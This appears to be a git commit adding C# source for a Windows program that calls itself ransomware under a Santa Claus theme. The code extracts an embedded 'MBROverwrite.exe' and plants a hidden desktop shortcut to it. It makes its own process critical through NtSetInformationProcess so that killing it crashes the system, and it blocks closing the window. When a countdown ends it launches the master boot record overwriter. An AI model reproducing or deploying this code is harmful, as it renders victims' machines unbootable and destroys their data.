89bd748daa94c9ddcd5fab9d02d265dd599872ae
GlebYoutuber <73891760+GlebYoutuber@users.noreply.github.com>
2021-12-29 12:48:50 +0200

    Santa Claus Will Kill Your PC(Fake Shell)

---
+++ sourcecode/fakeshell/santaclauskillyourpc/SantaClausKillPC.Designer.cs
@@ -0,0 +1,107 @@
+﻿namespace SantaClausWillKillYourPC
+{
+    partial class SantaClausKillPC
+    {
+        /// <summary>
+        /// Обязательная переменная конструктора.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Освободить все используемые ресурсы.
+        /// </summary>
+        /// <param name="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Код, автоматически созданный конструктором форм Windows
+
+        /// <summary>
+        /// Требуемый метод для поддержки конструктора — не изменяйте 
+        /// содержимое этого метода с помощью редактора кода.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(SantaClausKillPC));
+            this.timertodeathpc = new System.Windows.Forms.Label();
+            this.pcwillbedead = new System.Windows.Forms.Label();
+            this.CountdownTimer = new System.Windows.Forms.Timer(this.components);
+            this.SuspendLayout();
+            // 
+            // timertodeathpc
+            // 
+            this.timertodeathpc.AutoSize = true;
+            this.timertodeathpc.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(224)))), ((int)(((byte)(192)))));
+            this.timertodeathpc.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.timertodeathpc.Cursor = System.Windows.Forms.Cursors.No;
+            this.timertodeathpc.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
+            this.timertodeathpc.Font = new System.Drawing.Font("Bodoni MT Condensed", 27.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.timertodeathpc.ForeColor = System.Drawing.Color.RosyBrown;
+            this.timertodeathpc.Location = new System.Drawing.Point(228, 469);
+            this.timertodeathpc.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
+            this.timertodeathpc.Name = "timertodeathpc";
+            this.timertodeathpc.Size = new System.Drawing.Size(140, 57);
+            this.timertodeathpc.TabIndex = 0;
+            this.timertodeathpc.Text = "00:00:00";
+            // 
+            // pcwillbedead
+            // 
+            this.pcwillbedead.AutoSize = true;
+            this.pcwillbedead.BackColor = System.Drawing.Color.Black;
+            this.pcwillbedead.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
+            this.pcwillbedead.Cursor = System.Windows.Forms.Cursors.PanNW;
+            this.pcwillbedead.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
+            this.pcwillbedead.Font = new System.Drawing.Font("Constantia", 20.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.pcwillbedead.ForeColor = System.Drawing.Color.Yellow;
+            this.pcwillbedead.Location = new System.Drawing.Point(112, 34);
+            this.pcwillbedead.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
+            this.pcwillbedead.Name = "pcwillbedead";
+            this.pcwillbedead.Size = new System.Drawing.Size(420, 43);
+            this.pcwillbedead.TabIndex = 1;
+            this.pcwillbedead.Text = "Your PC will be Dead in...";
+            // 
+            // CountdownTimer
+            // 
+            this.CountdownTimer.Enabled = true;
+            this.CountdownTimer.Interval = 300000;
+            this.CountdownTimer.Tick += new System.EventHandler(this.CountdownTimer_Tick);
+            // 
+            // SantaClausKillPC
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.Red;
+            this.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("$this.BackgroundImage")));
+            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
+            this.ClientSize = new System.Drawing.Size(673, 554);
+            this.Controls.Add(this.pcwillbedead);
+            this.Controls.Add(this.timertodeathpc);
+            this.Cursor = System.Windows.Forms.Cursors.AppStarting;
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.Fixed3D;
+            this.Margin = new System.Windows.Forms.Padding(4);
+            this.MaximizeBox = false;
+            this.Name = "SantaClausKillPC";
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.Text = "Santa Claus is Going to Kill Your PC";
+            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.SantaClausKillPC_FormClosing);
+            this.Load += new System.EventHandler(this.SantaClausKillPC_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+        private System.Windows.Forms.Label timertodeathpc;
+        private System.Windows.Forms.Label pcwillbedead;
+        private System.Windows.Forms.Timer CountdownTimer;
+    }
+}
+
---
+++ sourcecode/fakeshell/santaclauskillyourpc/SantaClausKillPC.cs
@@ -0,0 +1,114 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Media;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Reflection;
+using IWshRuntimeLibrary;
+
+namespace SantaClausWillKillYourPC
+{
+    public partial class SantaClausKillPC : Form
+    {
+        SoundPlayer santaclaus = new SoundPlayer();
+        [DllImport("ntdll.dll", SetLastError = true)]
+        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
+
+        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
+        {
+            //This is Very Important Code... DON'T CHANGE THIS!!! 
+
+            Assembly assembly = Assembly.GetCallingAssembly();
+
+            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
+            using (BinaryReader r = new BinaryReader(s))
+            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
+            using (BinaryWriter w = new BinaryWriter(fs))
+                w.Write(r.ReadBytes((int)s.Length));
+        }
+        public SantaClausKillPC()
+        {
+            MessageBox.Show("Santa Claus is Now Hate You, Because you don't pay me or password is INCORRECT, Nice Work Man :D", "Santa Claus Killer PC", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            Directory.CreateDirectory(@"C:\Temp\Santa Claus Killer");
+            InitializeComponent();
+            Extract("SantaClausWillKillYourPC", @"C:\Temp\Santa Claus Killer", "Resources", "MelancholiaSantaClaus.wav");
+            Extract("SantaClausWillKillYourPC", @"C:\Temp\Santa Claus Killer", "Resources", "MBROverwrite.exe");
+            santaclaus = new SoundPlayer(@"C:\Temp\Santa Claus Killer\MelancholiaSantaClaus.wav");
+            santaclaus.PlayLooping();
+            ShortcutCreateMBR();
+            int isCritical = 1;  // we want this to be a Critical Process
+            int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
+            Process.EnterDebugMode();  //acquire Debug Privileges
+            // setting the BreakOnTermination = 1 for the current process
+            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
+        }
+
+        private void SantaClausKillPC_Load(object sender, EventArgs e)
+        {
+            TimertoDeathYourPC();
+        }
+
+        private void TimertoDeathYourPC()
+        {
+            CountdownTimer.Start();
+            var TimeStart = DateTime.Now;
+            var intervaltimer = new Timer() { Interval = 1000 };
+            intervaltimer.Tick += (obj, args) =>
+            timertodeathpc.Text =
+            (TimeSpan.FromMinutes(10) - (DateTime.Now - TimeStart))
+            .ToString("hh\\:mm\\:ss");
+            intervaltimer.Start();
+            intervaltimer.Enabled = true;
+        }
+
+        private void ShortcutCreateMBR()
+        {
+            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+            WshShell wsh = new WshShell();
+            IWshShortcut shortcut = wsh.CreateShortcut(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"/MBROverwrite.lnk") as IWshShortcut;
+            shortcut.TargetPath = @"C:\Temp\Santa Claus Killer\MBROverwrite.exe";
+            shortcut.Arguments = "-BypassWarning";
+            shortcut.WorkingDirectory = @"C:\Temp\Santa Claus Killer";
+            shortcut.Save();
+            FileInfo fileInfo = new FileInfo(desktop + @"/MBROverwrite.lnk");
+            fileInfo.Attributes = FileAttributes.Hidden;
+        }
+        private void BSOD()
+        {
+            Environment.Exit(-750);
+        }
+
+        private void SantaClausKillPC_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            e.Cancel = true;
+            MessageBox.Show("Santa Claus will not give you to close this ransomware", "Santa Claus Killer PC", MessageBoxButtons.OK, MessageBoxIcon.None);
+        }
+
+        private void CountdownTimer_Tick(object sender, EventArgs e)
+        {
+            if(CountdownTimer.Interval > 1000)
+            {
+                MessageBox.Show("Your PC is Already Dead" + Environment.NewLine + "Thank you for testing this ransomware, Made by Haulgames(Creator of this ransomware is GlebYoutuber)", "Santa Claus Killer PC", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                try
+                {
+                    string shortcutmbr = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"/MBROverwrite.lnk";
+                    Process.Start(shortcutmbr);
+                    MessageBox.Show("MBR is Overwritten", "Santa Claus Killer PC", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    BSOD();
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show("Error: " + ex.Message, "Santa Claus Killer PC", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                }
+            }
+        }
+    }
+}
